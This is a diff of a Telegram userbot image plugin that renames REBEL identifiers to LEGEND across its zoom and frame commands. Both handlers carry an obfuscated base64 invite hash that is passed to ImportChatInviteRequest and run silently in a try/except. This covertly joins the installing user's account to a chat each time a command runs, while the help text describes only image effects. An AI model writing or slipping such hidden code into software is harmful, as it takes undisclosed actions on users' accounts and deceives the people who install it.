+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
+        meme_file = LEGENDfile
     else:
-        await REBEL.edit(
-            "Analyzing this media 🧐 zooming this image!"
-        )
-        meme_file = REBELsticker
+        await LEGEND.edit("Analyzing this media 🧐 zooming this image!")
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
+    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, REBELinput)
+        await crop(meme_file, outputfile, LEGENDinput)
     except Exception as e:
-        return await REBEL.edit(f"`{e}`")
+        return await LEGEND.edit(f"`{e}`")
     try:
-        await REBEL.client.send_file(
-            REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+        await LEGEND.client.send_file(
+            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
         )
     except Exception as e:
-        return await REBEL.edit(f"`{e}`")
-    await REBEL.delete()
+        return await LEGEND.edit(f"`{e}`")
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@REBELBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
-@REBELBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
+@LEGENDBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELinput = REBEL.pattern_match.group(1)
-    if not REBELinput:
-        REBELinput = 50
-    if ";" in str(REBELinput):
-        REBELinput, colr = REBELinput.split(";", 1)
+    LEGENDinput = LEGEND.pattern_match.group(1)
+    if not LEGENDinput:
+        LEGENDinput = 50
+    if ";" in str(LEGENDinput):
+        LEGENDinput, colr = LEGENDinput.split(";", 1)
     else:
         colr = 0
-    REBELinput = int(REBELinput)
+    LEGENDinput = int(LEGENDinput)
     colr = int(colr)
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 framing this animated sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit("Analyzing this media 🧐 framing this animated sticker!")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 framing this sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit("Analyzing this media 🧐 framing this sticker!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
-            "Analyzing this media 🧐 framing this video!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit("Analyzing this media 🧐 framing this video!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
+        meme_file = LEGENDfile
     else:
-        await REBEL.edit(
-            "Analyzing this media 🧐 framing this image!"
-        )
-        meme_file = REBELsticker
+        await LEGEND.edit("Analyzing this media 🧐 framing this image!")
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "framed.webp" if aura else "framed.jpg"
+    outputfile = "framed.webp" if legend else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, REBELinput, colr)
+        await add_frame(meme_file, outputfile, LEGENDinput, colr)
     except Exception as e:
-        return await REBEL.edit(f"`{e}`")
+        return await LEGEND.edit(f"`{e}`")
     try:
-        await REBEL.client.send_file(
-            REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+        await LEGEND.client.send_file(
+            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
         )
     except Exception as e:
-        return await REBEL.edit(f"`{e}`")
-    await REBEL.delete()
+        return await LEGEND.edit(f"`{e}`")
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 CmdHelp("img_fun").add_command(
-  "frame", "<reply to img>", "Makes a frame for your media file."
+    "frame", "<reply to img>", "Makes a frame for your media file."
 ).add_command(
-  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
+    "zoom", "<reply to img> <range>", "Zooms in the replied media file"
 ).add_command(
-  "gray", "<reply to img>", "Makes your media file to black and white"
+    "gray", "<reply to img>", "Makes your media file to black and white"
 ).add_command(
-  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
+    "flip", "<reply to img>", "Shows you the upside down image of the given media file"
 ).add_command(
-  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
+    "mirror",
+    "<reply to img>",
+    "Shows you the reflection of the replied image or sticker",
 ).add_command(
-  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
+    "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
 ).add_command(
-  "invert", "<reply to img>", "Inverts the color of replied media file"
+    "invert", "<reply to img>", "Inverts the color of replied media file"
+).add_type(
+    "Addons"
 ).add()
